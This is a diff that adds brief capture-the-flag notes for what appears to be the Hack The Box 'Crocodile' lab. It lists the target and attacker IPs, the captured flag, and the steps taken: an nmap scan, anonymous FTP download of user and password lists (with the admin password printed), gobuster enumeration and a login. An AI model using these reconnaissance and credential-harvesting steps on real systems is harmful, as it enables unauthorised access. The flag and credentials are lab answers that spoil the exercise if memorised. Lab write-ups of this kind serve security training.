@@ -1,0 +1,20 @@
+Target IP:  10.129.1.15
+
+Attacking IP:  10.10.14.115
+
+
+flag:
+c7110277ac44d78b6a9fff2232434d16
+
+Steps:
+1. nmap -sV -p- 10.129.1.15
+2. ftp 10.129.1.15 (anonymous)
+3. get allowed.userlist
+4. get allowed.userlist.passwd
+5. cat allowed.userlist
+	admin
+6. cat allowed.userlist.passwd
+	rKXM59ESxesUFHAd
+8. gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u crocodile.htb -x .php
+8. Login to crocodile.htb/login.php
+
